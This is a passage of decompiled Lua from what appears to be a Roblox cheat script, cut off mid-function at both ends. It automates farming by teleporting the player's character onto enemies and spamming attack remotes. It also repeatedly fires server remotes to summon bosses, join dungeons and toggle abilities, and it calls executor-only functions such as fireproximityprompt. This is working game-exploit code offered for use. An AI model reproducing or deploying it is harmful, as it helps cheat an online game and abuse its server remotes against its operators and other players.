        local iteratorValue9, lastActiveAttack, matchResult, matchResult2, matchResult3, mobs, nPCs, name, name2, numberValue, numberValue2, pairsValue
        local result, result2, result3, result4, result5, savedIterations, savedIterations2, savedIterations3, savedIterations4, savedIterations5, savedIterations6, savedIterations7
        local tickResult, tickResult2, value, value2, value3, value4, workspaceValue, workspaceValue2, workspaceValue3, workspaceValue4
        if not environment._G.BossIsActive then
            enabled2 = false
            if environment._G.SelectedAllMobs then
                callResults5 = runtime.pack(environment.pairs(environment._G.SelectedAllMobs))
                callResults6 = callResults5
                savedIterations4 = { nil, [5] = nil, nil, nil }
                result3 = runtime.wrapIterator(runtime.iteratorBody1)
                result3(callResults6[1], callResults6[2], callResults6[3])
                iteratorValue3 = nil
                iterationCursor3 = result3
                while true do
                    hasNext, iteratorKey, iteratorValue2 = iterationCursor3()
                    if not hasNext then
                    else
                        iteratorValue3 = iteratorValue2
                    end
                    if hasNext then
                        if not iteratorValue3 then
                            continue
                        else
                            enabled2 = true
                        end
                    end
                    break
                end
                iterationCursor4 = savedIterations4[3]
                iterationLimit2 = savedIterations4[2]
                iterationStep2 = savedIterations4[5]
                savedIterations5 = savedIterations4[1]
            end
            if not enabled2 then
                environment.task.wait(0.5)
                return
            else
                value2 = capturedValues2[capturedAutoFarmState.value]
                if not environment._G.SelectedAllMobs[value2] then
                    numberValue2 = (capturedAutoFarmState.value + 1)
                    capturedAutoFarmState.value = numberValue2
                    if #capturedValues2 < capturedAutoFarmState.value then
                        capturedAutoFarmState.value = 1
                    end
                    capturedTextValueState2.value = {}
                    capturedTextValueState3.value = value
                    return
                else
                    character = capturedLocalPlayer2.Character
                    humanoidRootPart2 = character
                    if humanoidRootPart2 then
                        character2 = character
                        humanoidRootPart2 = character2.FindFirstChild(character2, "HumanoidRootPart")
                    end
                    if not humanoidRootPart2 then
                        return
                    else
                        value3 = capturedItems41[value2]
                        if not value3 then
                            return
                        else
                            island = value3.Island
                            if not environment._G.BossIsActive then
                                if capturedTextValueState3.value ~= island then
                                    capturedCallback6(island)
                                    capturedTextValueState3.value = island
                                    capturedTextValueState2.value = {}
                                    capturedTextValueState4.value = 0
                                    environment.task.wait(0.2)
                                    return
                                else
                                    while true do
                                        if 0 < #capturedTextValueState2.value then
                                            item3 = capturedTextValueState2.value[1]
                                            if (not item3) or not item3.Parent then
                                                environment.table.remove(capturedTextValueState2.value, 1)
                                                capturedValuesState.value = value
                                                continue
                                            else
                                                item2 = item3
                                                if
                                                    not (item2.FindFirstChild(item2, "Humanoid"))
                                                    or (item3.Humanoid.Health <= 0)
                                                then
                                                    environment.table.remove(capturedTextValueState2.value, 1)
                                                    capturedValuesState.value = value
                                                    continue
                                                else
                                                    if capturedValuesState.value == item3 then
                                                        if
                                                            20
                                                            < (
                                                                (environment.tick())
                                                                - capturedDefaultState.value
                                                            )
                                                        then
                                                            environment.table.remove(
                                                                capturedTextValueState2.value,
                                                                1
                                                            )
                                                            capturedValuesState.value = value
                                                            continue
                                                        end
                                                    else
                                                        capturedValuesState.value = item3
                                                        tickResult = environment.tick()
                                                        capturedDefaultState.value = tickResult
                                                    end
                                                end
                                            end
                                        end
                                        break
                                    end
                                    if #capturedTextValueState2.value == 0 then
                                        items2 = runtime.create(3)
                                        workspaceValue = environment.workspace
                                        enemies = workspaceValue.FindFirstChild(workspaceValue, "Enemies")
                                        workspaceValue2 = environment.workspace
                                        mobs = workspaceValue2.FindFirstChild(workspaceValue2, "Mobs")
                                        workspaceValue3 = environment.workspace
                                        nPCs = workspaceValue3.FindFirstChild(workspaceValue3, "NPCs")
                                        workspaceValue4 = environment.workspace
                                        callResults7 = runtime.pack(
                                            workspaceValue4.FindFirstChild(workspaceValue4, "Npcs")
                                        )
                                        items3 = items2
                                        runtime.move({ enemies, mobs, nPCs }, 1, 3, 1, items3)
                                        runtime.move(
                                            callResults7,
                                            1,
                                            (((callResults7.n + 11) - 1) - 10),
                                            4,
                                            items3
                                        )
                                        matchResult2 = environment.string.match(value2, "([^%(]+)")
                                        if matchResult2 then
                                            matchResult = matchResult2
                                            matchResult2 = (matchResult.gsub(matchResult, "%s+$", ""))
                                        end
                                        items = {}
                                        callResults = runtime.pack(environment.pairs(items2))
                                        callResults2 = callResults
                                        savedIterations = {
                                            savedIterations5,
                                            [5] = iterationStep2,
                                            iterationLimit2,
                                            iterationCursor4,
                                        }
                                        result = runtime.wrapIterator(runtime.iteratorBody1)
                                        result(callResults2[1], callResults2[2], callResults2[3])
                                        iteratorValue = nil
                                        iterationCursor7 = result
                                        while true do
                                            hasNext2, iteratorKey2, iteratorValue4 = iterationCursor7()
                                            if not hasNext2 then
                                            else
                                                iteratorValue = iteratorValue4
                                            end
                                            if hasNext2 then
                                                if iteratorValue then
                                                    pairsValue = environment.pairs
                                                    iteratorValue7 = iteratorValue
                                                    callResults8 = runtime.pack(
                                                        iteratorValue7.GetChildren(iteratorValue7)
                                                    )
                                                    callResults9 = runtime.pack(
                                                        pairsValue(
                                                            runtime.unpack(
                                                                callResults8,
                                                                1,
                                                                (((callResults8.n + 14) - 1) - 13)
                                                            )
                                                        )
                                                    )
                                                    callResults10 = callResults9
                                                    savedIterations6 = {
                                                        savedIterations,
                                                        [5] = iterationStep2,
                                                        iterationLimit2,
                                                        iterationCursor7,
                                                    }
                                                    result4 = runtime.wrapIterator(runtime.iteratorBody1)
                                                    result4(
                                                        callResults10[1],
                                                        callResults10[2],
                                                        callResults10[3]
                                                    )
                                                    iteratorValue8 = nil
                                                    iterationCursor5 = result4
                                                    while true do
                                                        hasNext4, iteratorKey4, iteratorValue11 =
                                                            iterationCursor5()
                                                        if not hasNext4 then
                                                        else
                                                            iteratorValue8 = iteratorValue11
                                                        end
                                                        if hasNext4 then
                                                            enabled = false
                                                            if
                                                                not (
                                                                    environment.table.find(
                                                                        value3.MobNames,
                                                                        iteratorValue8.Name
                                                                    )
                                                                )
                                                            then
                                                                if
                                                                    not (
                                                                        not matchResult2
                                                                        or not (
                                                                            environment.string.find(
                                                                                iteratorValue8.Name,
                                                                                matchResult2
                                                                            )
                                                                        )
                                                                    )
                                                                then
                                                                    matchResult3 = matchResult2
                                                                    if
                                                                        not (
                                                                            environment.string.find(
                                                                                (
                                                                                    matchResult3.lower(
                                                                                        matchResult3
                                                                                    )
                                                                                ),
                                                                                "boss"
                                                                            )
                                                                        )
                                                                    then
                                                                        find2 = environment.string.find
                                                                        name2 = iteratorValue8.Name
                                                                        if
                                                                            not (
                                                                                find2(
                                                                                    (name2.lower(name2)),
                                                                                    "boss"
                                                                                )
                                                                            )
                                                                        then
                                                                            enabled = true
                                                                        else
                                                                            enabled = false
                                                                        end
                                                                    else
                                                                        enabled = true
                                                                    end
                                                                end
                                                            else
                                                                enabled = true
                                                            end
                                                            if enabled then
                                                                find = environment.string.find
                                                                name = iteratorValue8.Name
                                                                if
                                                                    not (find((name.lower(name)), "dummy"))
                                                                then
                                                                    iteratorValue5 = iteratorValue8
                                                                    humanoid = iteratorValue5.FindFirstChild(
                                                                        iteratorValue5,
                                                                        "Humanoid"
                                                                    )
                                                                    iteratorValue6 = iteratorValue8
                                                                    humanoidRootPart =
                                                                        iteratorValue6.FindFirstChild(
                                                                            iteratorValue6,
                                                                            "HumanoidRootPart"
                                                                        )
                                                                    if
                                                                        not (
                                                                            (
                                                                                not humanoid
                                                                                or not (0 < humanoid.Health)
                                                                            )
                                                                            or not humanoidRootPart
                                                                        )
                                                                    then
                                                                        environment.table.insert(
                                                                            items,
                                                                            iteratorValue8
                                                                        )
                                                                    end
                                                                end
                                                            end
                                                            continue
                                                        end
                                                        break
                                                    end
                                                    iterationCursor7 = savedIterations6[3]
                                                    iterationLimit2 = savedIterations6[2]
                                                    iterationStep2 = savedIterations6[5]
                                                    savedIterations = savedIterations6[1]
                                                end
                                                continue
                                            end
                                            break
                                        end
                                        iterationCursor6 = savedIterations[3]
                                        iterationLimit3 = savedIterations[2]
                                        iterationStep3 = savedIterations[5]
                                        savedIterations7 = savedIterations[1]
                                        if 0 < #items then
                                            environment.table.sort(
                                                items,
                                                functions.handleCallback5(environment, humanoidRootPart2)
                                            )
                                            callResults3 = runtime.pack(environment.ipairs(items))
                                            callResults4 = callResults3
                                            savedIterations3 = {
                                                savedIterations7,
                                                [5] = iterationStep3,
                                                iterationLimit3,
                                                iterationCursor6,
                                            }
                                            result2 = runtime.wrapIterator(runtime.iteratorBody1)
                                            result2(callResults4[1], callResults4[2], callResults4[3])
                                            iteratorValue10 = nil
                                            iterationCursor2 = result2
                                            while true do
                                                hasNext3, iteratorKey3, iteratorValue9 = iterationCursor2()
                                                if not hasNext3 then
                                                else
                                                    iteratorValue10 = iteratorValue9
                                                end
                                                if hasNext3 then
                                                    environment.table.insert(
                                                        capturedTextValueState2.value,
                                                        iteratorValue10
                                                    )
                                                    continue
                                                end
                                                break
                                            end
                                            iterationCursor = savedIterations3[3]
                                            iterationLimit = savedIterations3[2]
                                            iterationStep = savedIterations3[5]
                                            savedIterations2 = savedIterations3[1]
                                        end
                                        if #capturedTextValueState2.value == 0 then
                                            if capturedTextValueState4.value == 0 then
                                                tickResult2 = environment.tick()
                                                capturedTextValueState4.value = tickResult2
                                            end
                                            if not environment._G.BossIsActive then
                                                result5 = capturedCallback5(value2)
                                                if result5 then
                                                    capturedCallback8(result5)
                                                end
                                                if
                                                    0.8
                                                    < ((environment.tick()) - capturedTextValueState4.value)
                                                then
                                                    numberValue = (capturedAutoFarmState.value + 1)
                                                    capturedAutoFarmState.value = numberValue
                                                    if #capturedValues2 < capturedAutoFarmState.value then
                                                        capturedAutoFarmState.value = 1
                                                    end
                                                    capturedTextValueState4.value = 0
                                                    capturedTextValueState3.value = value
                                                end
                                                return
                                            else
                                                return
                                            end
                                        else
                                            capturedTextValueState4.value = 0
                                            return
                                        end
                                    else
                                        capturedTextValueState4.value = 0
                                        item = capturedTextValueState2.value[1]
                                        if not environment._G.BossIsActive then
                                            value4 = capturedCallback8
                                            callResults11 =
                                                runtime.pack(capturedCallback13(item.HumanoidRootPart))
                                            value4(
                                                runtime.unpack(
                                                    callResults11,
                                                    1,
                                                    (((callResults11.n + 9) - 1) - 8)
                                                )
                                            )
                                            if capturedSharedValueState4.value then
                                                environment.task.spawn(
                                                    functions.handleFireServer(
                                                        environment,
                                                        capturedSharedValueState4
                                                    )
                                                )
                                            end
                                            gValue = environment._G
                                            lastActiveAttack = environment.tick()
                                            gValue.LastActiveAttack = lastActiveAttack
                                            if
                                                not (
                                                    not environment._G.AutoEquipEnabled
                                                    or not environment._G.SelectedWeaponGroup
                                                )
                                            then
                                                capturedCallback15(environment._G.SelectedWeaponGroup)
                                            end
                                            return
                                        else
                                            return
                                        end
                                    end
                                end
                            else
                                return
                            end
                        end
                    end
                end
            end
        else
            return
        end
    end, closureEnvironment)
end

function functions.handleCallback5(closureEnvironment, capturedHumanoidRootPart2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, argument2 = ...
        return (
            ((capturedHumanoidRootPart2.Position - argument1.HumanoidRootPart.Position)).Magnitude
            < ((capturedHumanoidRootPart2.Position - argument2.HumanoidRootPart.Position)).Magnitude
        )
    end, closureEnvironment)
end

function functions.handleFireServer(closureEnvironment, capturedSharedValueState4)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local iterationCursor, iterationCursor2, iterationLimit, iterationLimit2, iterationStep, iterationStep2, matches, savedIterations, savedIterations2, value
        savedIterations2 = { nil, [5] = nil, nil, nil }
        iterationStep2 = (1 + 0)
        iterationLimit2 = (5 + 0)
        iterationCursor = (1 - iterationStep2)
        while true do
            iterationCursor = (iterationCursor + iterationStep2)
            if iterationStep2 <= 0 then
                matches = (iterationCursor >= iterationLimit2)
            else
                matches = (iterationCursor <= iterationLimit2)
            end
            if matches then
                value = capturedSharedValueState4.value
                value.FireServer(value)
                continue
            end
            break
        end
        iterationCursor2 = savedIterations2[3]
        iterationLimit = savedIterations2[2]
        iterationStep = savedIterations2[5]
        savedIterations = savedIterations2[1]
        return
    end, closureEnvironment)
end

function functions.handleSpawnAtLine1(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local autoSummon, gValue
        autoSummon = argument1
        gValue = environment._G
        gValue.AutoSummon = autoSummon
        if autoSummon then
            environment.task.spawn(functions.handleWaitAtLine26(environment))
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine26(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            if environment._G.AutoSummon then
                environment.task.wait(2)
                environment.pcall(functions.handleWaitForChildAtLine77(environment))
                continue
            end
            break
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine77(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, fireServer, gameValue, items, value, value2, value3
        if not ((not environment._G.SelectedSummonBoss) or (environment._G.SelectedSummonBoss == "None")) then
            items = runtime.create(1)
            runtime.move({ environment._G.SelectedSummonBoss }, 1, 1, 1, items)
            gameValue = environment.game
            value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
            value2 = (value.WaitForChild(value, "Remotes"))
            value3 = (value2.WaitForChild(value2, "RequestSummonBoss"))
            fireServer = value3.FireServer
            callResults = runtime.pack(environment.unpack(items))
            fireServer(value3, runtime.unpack(callResults, 1, (((callResults.n + 4) - 1) - 3)))
        end
        return
    end, closureEnvironment)
end

function functions.handleNew3(closureEnvironment, capturedCallback9)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local callback
        if argument1 == true then
            callback = functions.handleCallbackAtLine2156(
                environment,
                capturedCallback9,
                (
                    environment.CFrame.new(
                        392.870026,
                        -2.22865272,
                        -2177.80151,
                        -0.912216544,
                        0,
                        -0.409708411,
                        0,
                        1,
                        0,
                        0.409708411,
                        0,
                        -0.912216544
                    )
                )
            )
            environment.task.spawn(callback)
        end
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine2156(closureEnvironment, capturedCallback9, capturedSharedValue)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        capturedCallback9(capturedSharedValue.Position)
        return
    end, closureEnvironment)
end

function functions.callbackAtLine115(closureEnvironment, capturedOptions, capturedBossState)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(2)
            if not ((not capturedOptions.AutoJoinDungeon) or not capturedOptions.AutoJoinDungeon.Value) then
                environment.pcall(functions.handleWaitForChildAtLine2588(environment, capturedBossState))
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine2588(closureEnvironment, capturedBossState)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, value, value2, value3
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        value3 = (value2.WaitForChild(value2, "RequestDungeonPortal"))
        value3.FireServer(value3, capturedBossState.value)
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine1(closureEnvironment, capturedCallback8)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, argument2, argument3 = ...
        local argument12, argument22, argument32, assemblyAngularVelocity, assemblyLinearVelocity, character, character2, character3, character4, humanoidRootPart, humanoidRootPart2, numberValue
        local numberValue2
        argument12 = argument1
        argument22 = argument2
        argument32 = argument3
        numberValue = 0
        while true do
            numberValue2 = argument22
            if not numberValue2 then
                numberValue2 = 10
            end
            if not ((not (numberValue < numberValue2)) or not ((not argument32) or argument32.Value)) then
                character4 = environment.game.Players.LocalPlayer.Character
                if not character4 then
                    environment.task.wait(0.05)
                    numberValue = (numberValue + 0.05)
                    continue
                else
                    character3 = character4
                    if not (character3.FindFirstChild(character3, "HumanoidRootPart")) then
                        environment.task.wait(0.05)
                        numberValue = (numberValue + 0.05)
                        continue
                    else
                        if
                            not (((character4.HumanoidRootPart.Position - argument12.Position)).Magnitude < 8)
                        then
                            capturedCallback8(argument12)
                            environment.task.wait(0.05)
                            numberValue = (numberValue + 0.05)
                            continue
                        end
                    end
                end
            end
            break
        end
        character2 = environment.game.Players.LocalPlayer.Character
        if character2 then
            character = character2
            if character.FindFirstChild(character, "HumanoidRootPart") then
                humanoidRootPart = character2.HumanoidRootPart
                assemblyLinearVelocity = environment.Vector3.zero
                humanoidRootPart.AssemblyLinearVelocity = assemblyLinearVelocity
                humanoidRootPart2 = character2.HumanoidRootPart
                assemblyAngularVelocity = environment.Vector3.zero
                humanoidRootPart2.AssemblyAngularVelocity = assemblyAngularVelocity
            end
        end
        return
    end, closureEnvironment)
end

function functions.handleIsA(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, character, character2, hasNext, humanoidRootPart, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey
        local iteratorValue, iteratorValue2, iteratorValue3, iteratorValue4, iteratorValue5, pairsValue, parent, parent2, result, savedIterations, savedIterations2, workspaceValue
        character2 = environment.game.Players.LocalPlayer.Character
        if not character2 then
            return
        else
            character = character2
            if not (character.FindFirstChild(character, "HumanoidRootPart")) then
                return
            else
                humanoidRootPart = character2.HumanoidRootPart
                pairsValue = environment.pairs
                workspaceValue = environment.workspace
                callResults = runtime.pack(workspaceValue.GetDescendants(workspaceValue))
                callResults2 =
                    runtime.pack(pairsValue(runtime.unpack(callResults, 1, (((callResults.n + 4) - 1) - 3))))
                callResults3 = callResults2
                savedIterations = { nil, [5] = nil, nil, nil }
                result = runtime.wrapIterator(runtime.iteratorBody1)
                result(callResults3[1], callResults3[2], callResults3[3])
                iteratorValue2 = nil
                iterationCursor = result
                while true do
                    hasNext, iteratorKey, iteratorValue = iterationCursor()
                    if not hasNext then
                    else
                        iteratorValue2 = iteratorValue
                    end
                    if hasNext then
                        iteratorValue3 = iteratorValue2
                        if
                            not (
                                not (iteratorValue3.IsA(iteratorValue3, "ProximityPrompt"))
                                or not iteratorValue2.Enabled
                            )
                        then
                            parent2 = iteratorValue2.Parent
                            if parent2 then
                                parent = parent2
                                if
                                    not (
                                        not (parent.IsA(parent, "BasePart"))
                                        or not (
                                            ((humanoidRootPart.Position - parent2.Position)).Magnitude
                                            <= (iteratorValue2.MaxActivationDistance + 5)
                                        )
                                    )
                                then
                                    if not environment.fireproximityprompt then
                                        iteratorValue4 = iteratorValue2
                                        iteratorValue4.InputHoldBegin(iteratorValue4)
                                        environment.task.wait((iteratorValue2.HoldDuration + 0.1))
                                        iteratorValue5 = iteratorValue2
                                        iteratorValue5.InputHoldEnd(iteratorValue5)
                                    else
                                        environment.fireproximityprompt(iteratorValue2)
                                    end
                                end
                            end
                        end
                        continue
                    end
                    break
                end
                iterationCursor2 = savedIterations[3]
                iterationLimit = savedIterations[2]
                iterationStep = savedIterations[5]
                savedIterations2 = savedIterations[1]
                return
            end
        end
    end, closureEnvironment)
end

function functions.handlePcallAtLine5(closureEnvironment, capturedLocalPlayer2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local enabledState
        enabledState = {}
        enabledState.value = true
        environment.pcall(
            functions.handleFindFirstChildAtLine45(environment, capturedLocalPlayer2, enabledState)
        )
        return enabledState.value
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine45(
    closureEnvironment,
    capturedLocalPlayer2,
    capturedEnabledState
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, contentText, item, item2, playerGui, playerGui2, quest, questUI, questUI2, value
        value = capturedLocalPlayer2
        playerGui = value.FindFirstChild(value, "PlayerGui")
        if not playerGui then
            return
        else
            playerGui2 = playerGui
            questUI2 = playerGui2.FindFirstChild(playerGui2, "QuestUI")
            if not questUI2 then
                return
            else
                questUI = questUI2
                quest = questUI.FindFirstChild(questUI, "Quest")
                if (not quest) or (quest.Visible ~= false) then
                    contentText = questUI2.Quest.Quest.Holder.Content.QuestInfo.QuestRequirement.ContentText
                    if not ((not contentText) or (contentText == "")) then
                        callResults = runtime.pack(environment.string.match(contentText, "(%d+)/(%d+)"))
                        callResults2 = callResults
                        item = callResults2[1]
                        item2 = callResults2[2]
                        if
                            not (
                                not item
                                or (
                                    not item2
                                    or not ((environment.tonumber(item)) < (environment.tonumber(item2)))
                                )
                            )
                        then
                            capturedEnabledState.value = false
                        end
                    end
                    return
                else
                    return
                end
            end
        end
    end, closureEnvironment)
end

function functions.handlePcallAtLine117(
    closureEnvironment,
    capturedOptions,
    capturedClonerefResult,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(0.1)
            if
                not (
                    not capturedOptions.AutoKillBossAnos
                    or ((not capturedOptions.AutoKillBossAnos.Value) or environment._G.IsPortaling)
                )
            then
                environment.pcall(
                    functions.handleFindFirstChildAtLine64(
                        environment,
                        capturedClonerefResult,
                        capturedCallback13,
                        capturedCallback8,
                        capturedCallback15,
                        capturedCallback14
                    )
                )
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine64(
    closureEnvironment,
    capturedClonerefResult,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, enemies, find, findFirstChildResult, findFirstChildResult2, findFirstChildResult3, findFirstChildResult4, hasNext, items, items2
        local iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorValue, iteratorValue2, iteratorValue3, mobs, nPCs, name, result
        local result2, savedIterations, savedIterations2, textValue, value, value2, value3, value4, value5
        textValue = ("AnosBoss_" .. environment._G.SelectedDifficultyAnos)
        findFirstChildResult3 = nil
        items = runtime.create(4)
        value = capturedClonerefResult
        value2 = capturedClonerefResult
        enemies = value2.FindFirstChild(value2, "Enemies")
        value3 = capturedClonerefResult
        mobs = value3.FindFirstChild(value3, "Mobs")
        value4 = capturedClonerefResult
        nPCs = value4.FindFirstChild(value4, "NPCs")
        value5 = capturedClonerefResult
        callResults = runtime.pack(value5.FindFirstChild(value5, "Npcs"))
        items2 = items
        runtime.move({ value, enemies, mobs, nPCs }, 1, 4, 1, items2)
        runtime.move(callResults, 1, (((callResults.n + 8) - 1) - 7), 5, items2)
        callResults2 = runtime.pack(environment.pairs(items))
        callResults3 = callResults2
        savedIterations2 = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults3[1], callResults3[2], callResults3[3])
        iteratorValue3 = nil
        iterationCursor2 = result
        while true do
            hasNext, iteratorKey, iteratorValue2 = iterationCursor2()
            if not hasNext then
            else
                iteratorValue3 = iteratorValue2
            end
            if hasNext then
                if not iteratorValue3 then
                    if not findFirstChildResult3 then
                        continue
                    end
                else
                    iteratorValue = iteratorValue3
                    findFirstChildResult = iteratorValue.FindFirstChild(iteratorValue, textValue)
                    if not findFirstChildResult then
                        if not findFirstChildResult3 then
                            continue
                        end
                    else
                        findFirstChildResult2 = findFirstChildResult
                        if
                            not (findFirstChildResult2.FindFirstChild(findFirstChildResult2, "Humanoid"))
                            or not (0 < findFirstChildResult.Humanoid.Health)
                        then
                            if not findFirstChildResult3 then
                                continue
                            end
                        else
                            findFirstChildResult4 = findFirstChildResult
                            if
                                not (
                                    findFirstChildResult4.FindFirstChild(
                                        findFirstChildResult4,
                                        "HumanoidRootPart"
                                    )
                                )
                            then
                                if not findFirstChildResult3 then
                                    continue
                                end
                            else
                                find = environment.string.find
                                name = findFirstChildResult.Name
                                if not (find((name.lower(name)), "dummy")) then
                                    findFirstChildResult3 = findFirstChildResult
                                else
                                    if not findFirstChildResult3 then
                                        continue
                                    end
                                end
                            end
                        end
                    end
                end
            end
            break
        end
        iterationCursor = savedIterations2[3]
        iterationLimit = savedIterations2[2]
        iterationStep = savedIterations2[5]
        savedIterations = savedIterations2[1]
        if findFirstChildResult3 then
            result2 = capturedCallback13(findFirstChildResult3.HumanoidRootPart)
            if capturedCallback8 then
                capturedCallback8(result2)
            end
            if not ((not environment._G.AutoEquipEnabled) or not environment._G.SelectedWeaponGroup) then
                capturedCallback15(environment._G.SelectedWeaponGroup)
            end
            if capturedCallback14 then
                capturedCallback14()
            end
        end
        return
    end, closureEnvironment)
end

function functions.handlePcallAtLine2161(closureEnvironment, capturedOptions)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(3)
            if not ((not capturedOptions.AutoSummonBossV2) or not capturedOptions.AutoSummonBossV2.Value) then
                environment.pcall(functions.handleWaitForChildAtLine2(environment))
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine2(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, fireServer, gameValue, items, requestSpawnStrongestBoss, requestSpawnStrongestBoss2, textValue, value, value2
        textValue = "StrongestToday"
        if environment._G.SelectedSummonV2Boss == "SukunaV2" then
            textValue = "StrongestHistory"
        end
        items = runtime.create(2)
        runtime.move({ textValue, environment._G.SelectedDifficultyV2 }, 1, 2, 1, items)
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        requestSpawnStrongestBoss = value2.WaitForChild(value2, "RequestSpawnStrongestBoss")
        if requestSpawnStrongestBoss then
            requestSpawnStrongestBoss2 = requestSpawnStrongestBoss
            fireServer = requestSpawnStrongestBoss2.FireServer
            callResults = runtime.pack(environment.unpack(items))
            fireServer(
                requestSpawnStrongestBoss2,
                runtime.unpack(callResults, 1, (((callResults.n + 6) - 1) - 5))
            )
        end
        return
    end, closureEnvironment)
end

function functions.handleFireServerAtLine1(
    closureEnvironment,
    capturedOptions,
    capturedReplicatedStorage,
    capturedItems17
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local remoteEvents, remoteEvents2, remoteEvents3, remoteEvents4, value
        environment.task.wait(2)
        if
            not (
                ((not capturedOptions) or not capturedOptions.AutoHaki) or not capturedOptions.AutoHaki.Value
            )
        then
            value = capturedReplicatedStorage
            remoteEvents2 = value.FindFirstChild(value, "RemoteEvents")
            if remoteEvents2 then
                remoteEvents4 = capturedReplicatedStorage.RemoteEvents
                remoteEvents2 = remoteEvents4.FindFirstChild(remoteEvents4, "HakiRemote")
            end
            if remoteEvents2 then
                remoteEvents = remoteEvents2
                remoteEvents.FireServer(remoteEvents, "GetStatus")
                environment.task.wait(0.5)
                if not capturedItems17.Active then
                    remoteEvents3 = remoteEvents2
                    remoteEvents3.FireServer(remoteEvents3, "Toggle")
                end
            end
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine105(closureEnvironment, capturedOptions)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(3)
            if not ((not capturedOptions.AutoSummonRimuru) or not capturedOptions.AutoSummonRimuru.Value) then
                environment.pcall(functions.handleWaitForChildAtLine18(environment))
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine18(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, fireServer, gameValue, items, value, value2, value3
        items = runtime.create(1)
        runtime.move({ environment._G.SelectedRimuruDifficulty }, 1, 1, 1, items)
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "RemoteEvents"))
        value3 = (value2.WaitForChild(value2, "RequestSpawnRimuru"))
        fireServer = value3.FireServer
        callResults = runtime.pack(environment.unpack(items))
        fireServer(value3, runtime.unpack(callResults, 1, (((callResults.n + 4) - 1) - 3)))
        return
    end, closureEnvironment)
end

function functions.handleCallback6(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedAllMobs = ...
        local gValue
        gValue = environment._G
        gValue.SelectedAllMobs = selectedAllMobs
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine42(
    closureEnvironment,
    capturedOptions,
    capturedClonerefResult,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(0.1)
            if
                not (
                    not capturedOptions.AutoKillBossV2
                    or ((not capturedOptions.AutoKillBossV2.Value) or environment._G.IsPortaling)
                )
            then
                environment.pcall(
                    functions.handleFindFirstChildAtLine66(
                        environment,
                        capturedClonerefResult,
                        capturedCallback13,
                        capturedCallback8,
                        capturedCallback15,
                        capturedCallback14
                    )
                )
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine66(
    closureEnvironment,
    capturedClonerefResult,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, enemies, find, findFirstChildResult, findFirstChildResult2, findFirstChildResult3, findFirstChildResult4, hasNext, items, items2
        local iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorValue, iteratorValue2, iteratorValue3, mobs, nPCs, name, result
        local savedIterations, savedIterations2, textValue, textValue2, value, value2, value3, value4, value5
        textValue2 = ""
        if environment._G.SelectedSummonV2Boss == "GojoV2" then
            textValue2 = "StrongestofTodayBoss"
        else
            if environment._G.SelectedSummonV2Boss == "SukunaV2" then
                textValue2 = "StrongestinHistoryBoss"
            end
        end
        textValue = (textValue2 .. ("_" .. environment._G.SelectedDifficultyV2))
        findFirstChildResult = nil
